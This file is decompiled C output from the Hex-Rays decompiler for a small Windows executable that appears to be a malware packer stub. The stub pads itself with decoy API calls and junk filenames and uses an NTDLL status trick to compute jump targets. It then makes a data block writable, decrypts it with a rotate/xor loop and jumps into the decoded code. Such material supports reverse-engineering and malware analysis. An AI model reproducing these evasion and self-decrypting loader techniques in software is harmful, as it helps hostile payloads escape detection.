/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
int __stdcall sub_415B50(_DWORD *, unsigned int, int);

//-------------------------------------------------------------------------
// Data declarations

// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
int dword_404000[10] =
{
  1393734752,
  -804400261,
  -427678477,
  2118777769,
  976486297,
  771789304,
  265984017,
  1115737701,
  -1536226890,
  -1178274471
}; // weak
_UNKNOWN loc_404028; // weak
_UNKNOWN loc_41599B; // weak
WCHAR a7okk2he6ph8x30[] = L"\u4F37\u6B6B\u6832\u3665\u6850\u7838\u2E33\u64309"; // idb
CHAR ProcName[] = "ZwCreateEventPair"; // idb
CHAR aPz4[] = ".pz4"; // idb
CHAR aSofey13uevm8wo[] = "SOFeY13uEVM8WOffKd.s1v"; // idb
CHAR aPwmopiy7Bzp[] = "PwMopiY7.bzp"; // idb
CHAR aHsw[] = ".hSW"; // idb
WCHAR FileName[] = L"\u7467\u7171\u6247\u724E\u514D\u7067\u736D\u7954\u614D\u2E31\u4258Y"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
WCHAR aPhkpi75ak1djp8[] = L"\u4870\u504B\u3769\u6135\u316B\u6A44\u3870\u6C5A\u6A52\u5467\u4B68\u506C\u472E\u3051"; // idb
WCHAR aFnmaq0h7xuugud[] = L"\u6E46\u416D\u3051\u3748\u5578\u4775\u4475\u2E56\u6742G"; // idb
WCHAR aSN0t[] = L"\u2E73\u306ET"; // idb


//----- (0041582B) --------------------------------------------------------
int start()
{
  HMODULE ModuleHandleA; // eax
  int *v2; // [esp-1Ch] [ebp-54h]
  SIZE_T v3; // [esp-18h] [ebp-50h]
  DWORD v4; // [esp-14h] [ebp-4Ch]
  DWORD *p_flOldProtect; // [esp-10h] [ebp-48h]
  void *v6; // [esp-8h] [ebp-40h]
  HANDLE FileW; // [esp+0h] [ebp-38h]
  HMODULE hModule; // [esp+8h] [ebp-30h]
  HANDLE hFile; // [esp+18h] [ebp-20h]
  void (*v10)(void); // [esp+20h] [ebp-18h]
  char *v11; // [esp+20h] [ebp-18h]
  NTSTATUS (__stdcall *ZwCreateEventPair)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES); // [esp+24h] [ebp-14h]
  HANDLE FileA; // [esp+28h] [ebp-10h]
  int v14; // [esp+30h] [ebp-8h]
  DWORD flOldProtect; // [esp+34h] [ebp-4h] BYREF

  GetCommandLineA();
  hFile = CreateFileW(FileName, 0x40000000u, 1u, 0, 3u, 0x24u, 0);
  ModuleHandleA = GetModuleHandleA(ModuleName);
  do
  {
    hModule = ModuleHandleA;
    GetCommandLineA();
    GetCommandLineA();
    GetFileType(hFile);
    if ( CreateFileW(aSN0t, 0x40000000u, 5u, 0, 3u, 0, 0) != (HANDLE)-1 )
      goto LABEL_8;
    ZwCreateEventPair = (NTSTATUS (__stdcall *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES))GetProcAddress(
                                                                                            hModule,
                                                                                            ProcName);
    v6 = hFile;
    do
    {
      GetFileSize(v6, 0);
      FileA = CreateFileA(aHsw, 0x80000000, 7u, 0, 3u, 0x105u, 0);
      v6 = 0;
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetLastError();
      GetFileType(FileA);
      v14 = ((int (__cdecl *)(_DWORD))ZwCreateEventPair)(0);
      GetFileSize(hFile, 0);
      CloseHandle(hFile);
      GetFileSize((HANDLE)0xFFFFFFFF, 0);
      GetLastError();
      v10 = (void (*)(void))((char *)&loc_41599B + (v14 ^ 0xC0000005));
      CloseHandle(hFile);
      v10();
      GetFileType((HANDLE)0xFFFFFFFF);
      p_flOldProtect = &flOldProtect;
      CloseHandle((HANDLE)0xFFFFFFFF);
      v4 = 64;
    }
    while ( CreateFileA(aSofey13uevm8wo, 0x60000000u, 7u, 0, 3u, 0x106u, 0) != (HANDLE)-1 );
    ModuleHandleA = (HMODULE)CreateFileW(a7okk2he6ph8x30, 0x20000000u, 0, 0, 3u, 0xA5u, 0);
  }
  while ( ModuleHandleA != (HMODULE)-1 );
  v3 = 71710;
  GetLastError();
  v2 = dword_404000;
  GetLastError();
  do
  {
    GetCommandLineA();
    VirtualProtect(v2, v3, v4, p_flOldProtect);
    p_flOldProtect = (DWORD *)v14;
    FileW = CreateFileW(aFnmaq0h7xuugud, 0x40000000u, 0, 0, 3u, 0x1A3u, 0);
    v4 = 71710;
    CreateFileA(aPwmopiy7Bzp, 0x60000000u, 1u, 0, 3u, 0x27u, 0);
    v3 = (SIZE_T)dword_404000;
    v10 = (void (*)(void))v14;
LABEL_8:
    GetFileSize(FileW, 0);
    v11 = (char *)v10 + 1073741819;
  }
  while ( CreateFileW(aPhkpi75ak1djp8, 0x60000000u, 7u, 0, 3u, 3u, 0) != (HANDLE)-1 );
  CreateFileA(aPz4, 0x20000000u, 5u, 0, 3u, 0x120u, 0);
  ((void (__cdecl *)(SIZE_T, DWORD, DWORD *))((char *)sub_415B50 + (_DWORD)v11))(v3, v4, p_flOldProtect);
  CloseHandle((HANDLE)0xFFFFFFFF);
  return ((int (*)(void))loc_404028)();
}
// 415A41: variable 'v2' is possibly undefined
// 415A41: variable 'v3' is possibly undefined
// 415A41: variable 'v4' is possibly undefined
// 415A41: variable 'p_flOldProtect' is possibly undefined
// 415A47: variable 'v14' is possibly undefined
// 415ABD: variable 'FileW' is possibly undefined
// 415AC3: variable 'v10' is possibly undefined
// 404000: using guessed type int dword_404000[10];

//----- (00415B50) --------------------------------------------------------
int __stdcall sub_415B50(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // edx
  int result; // eax

  v4 = a2 >> 2;
  result = a3;
  do
  {
    *a1 -= a3;
    *a1 -= a3;
    *a1 = __ROR4__(*a1, 235);
    *a1 -= 999187781;
    *a1 ^= a3;
    *a1 = __ROR4__(*a1, 14);
    *a1 += a3;
    *a1 = __ROR4__(*a1, 59);
    *a1 += 191522594;
    *a1++ -= a3;
    --v4;
  }
  while ( v4 );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
